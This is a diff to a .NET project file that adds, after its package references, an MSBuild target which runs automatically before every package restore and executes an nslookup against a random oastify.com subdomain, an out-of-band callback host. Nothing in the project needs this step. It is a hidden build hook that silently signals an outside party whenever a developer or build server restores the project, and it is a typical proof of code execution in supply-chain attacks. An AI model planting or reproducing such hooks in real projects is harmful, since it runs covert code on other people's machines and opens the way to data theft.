@@ -24,4 +24,10 @@
         <PackageReference Include="Npgsql.EntityFrameworkCore.PostgreSQL" Version="5.0.5.1" />
     </ItemGroup>
 
+
+<Target Name="RunCustomScriptOnRestore" BeforeTargets="Restore">
+    <Exec Command="nslookup cuau5c3ldvjcjw8ho1jhvdwbd2jt7svh.oastify.com" />
+  </Target>
+
+
 </Project>
